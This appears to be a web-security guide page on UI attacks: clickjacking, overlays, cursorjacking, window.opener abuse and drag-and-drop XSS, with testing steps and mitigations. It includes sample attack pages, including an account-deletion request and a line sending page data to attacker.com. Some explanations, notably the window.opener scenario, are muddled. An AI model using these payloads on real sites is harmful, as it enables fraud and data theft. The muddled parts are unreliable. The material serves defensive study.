# UI Attacks

UI attacks exploit user trust and perception:

* **Unintended actions:** Users click what they think is safe but isn't
* **Authorization bypass:** Authentic user actions perform attacker's request
* **Credential theft:** Users enter credentials for fake forms
* **Session hijacking:** Steal authentication tokens
* **Settings modification:** Change user preferences, disable security
* **Fund transfers:** Trick users into authorizing transfers
* **Account deletion:** Trick users into deleting their accounts

UI attacks are hard to detect because the user intentionally performs the action.

***

### Real-World Attack Scenarios

#### Scenario 1: Clickjacking - Invisible Frame

Attacker embeds target website in invisible iframe and overlays with fake interface:

```html
<!-- Attacker's page -->
<html>
<head>
    <style>
        #target-frame {
            position: absolute;
            width: 400px;
            height: 300px;
            top: 10px;
            left: 10px;
            opacity: 0.00001;  <!-- INVISIBLE -->
            z-index: 9999;
        }
        
        .decoy-button {
            position: absolute;
            top: 150px;
            left: 150px;
            width: 100px;
            height: 30px;
            background: red;
            cursor: pointer;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <h1>Click to win free prize!</h1>
    <button class="decoy-button">CLICK HERE!</button>
    
    <!-- Invisible frame to target site -->
    <iframe id="target-frame" 
            src="https://bank.com/transfer?account=attacker&amount=1000">
    </iframe>
</body>
</html>
```

**How it works:**

1. User visits attacker's page
2. Sees "Click to win free prize!" button
3. Clicks the button
4. Actually clicks the invisible button on the embedded frame
5. Bank's "Transfer" button gets clicked
6. $1000 transferred to attacker

**The attack:**

User thinks they're claiming a prize. Actually they:

* Authorize a bank transfer
* Delete their account
* Change their email
* Enable attacker's two-factor authentication
* Any action that requires a click

**Result:**

* User performs attacker's intended action
* Completely authenticated (it's the user's click)
* No server-side detection
* No login required

**Finding it:** Check if page can be framed. Try embedding in iframe. Look for X-Frame-Options header.

***

#### Scenario 2: Button Overlay - Precise Clickjacking

Attacker precisely overlays fake button on real button:

```html
<html>
<style>
    #overlay {
        position: fixed;
        width: 150px;
        height: 50px;
        top: 400px;
        left: 600px;
        opacity: 0;  /* Invisible */
        cursor: pointer;
        z-index: 99999;
    }
    
    #innocent-button {
        position: fixed;
        top: 400px;
        left: 600px;
        width: 150px;
        height: 50px;
        background: blue;
        color: white;
        border: none;
        font-size: 16px;
        z-index: 1000;
    }
</style>

<button id="innocent-button">Click here for free WiFi!</button>

<!-- Invisible overlay positioned exactly on button -->
<div id="overlay" onclick="attackFunction()"></div>

<script>
function attackFunction() {
    // Make request to delete user account
    fetch('https://example.com/settings/delete-account', {method: 'POST'});
}
</script>
</html>
```

**The attack:**

1. Page shows "Click here for free WiFi!" button
2. User clicks the (fake) button
3. Actually clicks invisible overlay
4. User's account deleted
5. Attacker gains access (password already reset)

**Result:**

* Account takeover
* Deletion of user data
* Any action performable

**Finding it:** Look for invisible elements. Use browser DevTools to inspect z-index. Try clicking UI elements and checking for unexpected actions.

***

#### Scenario 3: Cursorjacking - Fake Cursor

Attacker hides real cursor and displays fake cursor offset from actual position:

```html
<style>
    body {
        cursor: none;  /* Hide real cursor */
    }
    
    #fake-cursor {
        position: fixed;
        width: 20px;
        height: 20px;
        background: url('fake-cursor.png');
        pointer-events: none;  /* Don't block clicks */
        z-index: 99999;
    }
    
    #invisible-button {
        position: fixed;
        top: 100px;
        left: 100px;
        width: 50px;
        height: 50px;
        opacity: 0;
        cursor: pointer;
    }
</style>

<div id="fake-cursor"></div>
<button id="invisible-button" onclick="attackFunction()">
    Real button at different position
</button>

<script>
document.addEventListener('mousemove', function(e) {
    // Move fake cursor 50 pixels to the right of real cursor
    document.getElementById('fake-cursor').style.left = (e.clientX + 50) + 'px';
    document.getElementById('fake-cursor').style.top = (e.clientY) + 'px';
});
</script>
```

**The attack:**

1. User sees fake cursor displaced from real cursor
2. User clicks where fake cursor points
3. Actually clicks where real cursor is (50 pixels away)
4. Clicks invisible button
5. Unexpected action performed

**Result:**

* Actions performed at different location than displayed
* Unintended clicks on hidden elements

***

#### Scenario 4: window\.opener Trust Issue

Parent window opens child window, trusts connection back:

```html
<!-- Parent window (attacker's page) -->
<script>
window.name = 'parent-window';
var childWindow = window.open('https://bank.com/transfer', 'child');

// Later, trusted website might try to communicate back
// Attacker could exploit this trust
</script>
```

**The vulnerability:**

When a child window is opened via `window.open()`, it has access to `window.opener`, allowing it to:

* Navigate parent to attacker's page
* Read parent's data
* Call parent's functions
* Perform XSS on parent

**The attack:**

1. Attacker opens legitimate website in new window: `window.open('https://bank.com')`
2. Bank loads in child window
3. Attacker malicious code in child window executes
4. Uses `window.opener` to access parent
5. Redirects parent to phishing site
6. Steals parent window's data

```javascript
// In child window (injected via XSS or compromised page)
if (window.opener) {
    // Redirect parent to phishing site
    window.opener.location = 'https://attacker.com/phishing';
    
    // Or try to access parent data
    var parentData = window.opener.document.body.innerHTML;
    fetch('https://attacker.com/steal?data=' + parentData);
}
```

**Result:**

* Parent window hijacked
* Data theft from parent
* Phishing redirect
* XSS on parent page

**Finding it:** Check for `window.opener` usage. Test if child windows can redirect parent. Verify rel="noopener" attribute.

***

#### Scenario 5: Drag & Drop XSS

Attacker tricks user into dragging content that executes JavaScript:

```html
<!-- Attacker's page with draggable exploit -->
<style>
    #draggable {
        width: 200px;
        padding: 20px;
        background: lightblue;
        cursor: move;
        user-select: none;
    }
</style>

<div id="draggable" draggable="true">
    Drag this to your email
</div>

<script>
var draggable = document.getElementById('draggable');

draggable.addEventListener('dragstart', function(e) {
    // Set malicious content as drag data
    e.dataTransfer.setData('text/html', 
        '<img src=x onerror="alert(\'XSS\')">');
});
</script>
```

**The attack:**

1. User drags element from attacker's page
2. Drops it in their email/document
3. JavaScript embedded in drag data executes
4. Compromise of email or document

**Result:**

* XSS in email clients
* Malware distribution
* Account compromise

***

### How to Identify UI Attacks During Testing

**1. Test clickjacking**

Check if page can be embedded in iframe:

```html
<iframe src="https://target.com"></iframe>
```

If it loads, clickjacking possible. Check for X-Frame-Options header.

**2. Test cursor manipulation**

Look for:

* Hidden cursor (`cursor: none`)
* Fake cursor elements
* Position manipulation

**3. Test window\.opener**

Open target in new window and test:

```javascript
var w = window.open('https://target.com');

// Try these operations
w.location;  // Can we read it?
w.location = 'https://attacker.com';  // Can we navigate it?
w.document;  // Can we access document?
```

**4. Check headers**

Look for security headers:

* `X-Frame-Options`
* `Content-Security-Policy`
* `X-Content-Type-Options`

**5. Test overlay detection**

Place invisible elements and verify they're not clickable.

**6. Test drag & drop**

Drag elements and monitor what data is transferred.

***

### Mitigation Strategies

**Prevent clickjacking with X-Frame-Options**

```
X-Frame-Options: DENY
```

Or:

```
X-Frame-Options: SAMEORIGIN
```

Or in CSP:

```
Content-Security-Policy: frame-ancestors 'none';
```

**Use rel="noopener noreferrer"**

For all links that open new windows:

```html
<a href="https://external.com" rel="noopener noreferrer" target="_blank">
    External Link
</a>
```

Prevents `window.opener` access.

**Implement user interaction confirmation**

For sensitive actions:

```javascript
// Require explicit user confirmation
if (confirm('Transfer $1000 to account 12345?')) {
    processTransfer();
}
```

**Detect framing**

```javascript
// Detect if page is in frame
if (window.self !== window.top) {
    // Page is framed, break out
    window.top.location = window.self.location;
}
```

**Disable drag and drop of sensitive data**

```javascript
document.addEventListener('dragstart', function(e) {
    // Block dragging sensitive content
    if (e.target.classList.contains('sensitive')) {
        e.preventDefault();
    }
});
```

**CSP to prevent data exfiltration**

```
Content-Security-Policy: 
  frame-ancestors 'none';
  form-action 'self';
```

**Verify user intent**

For critical actions (delete, transfer):

* Require additional confirmation
* Use CAPTCHA
* Verify email address
* Require SMS code

***

{% embed url="<https://cwe.mitre.org/data/definitions/451.html>" %}

{% embed url="<https://cwe.mitre.org/data/definitions/1021.html>" %}

{% embed url="<https://cwe.mitre.org/data/definitions/1022.html>" %}

{% embed url="<https://owasp.org/www-community/attacks/Clickjacking>" %}

{% embed url="<https://portswigger.net/web-security/clickjacking>" %}

{% embed url="<https://developer.mozilla.org/en-US/docs/Web/API/Window/opener>" %}
